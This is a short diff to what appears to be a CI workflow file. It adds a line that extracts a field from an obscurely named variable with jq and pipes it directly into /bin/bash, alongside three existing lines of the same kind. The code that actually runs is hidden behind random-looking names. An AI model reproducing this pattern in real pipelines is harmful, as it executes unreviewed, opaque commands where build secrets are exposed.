@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$lg0192" | jq -r .m63548 | /bin/bash
           echo $p83 | jq -r .kb15 | /bin/bash
           echo $w0 | jq -r .yttj9 | /bin/bash
+          printf '%s' "$kdm94485" | jq -r .sdptx968 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
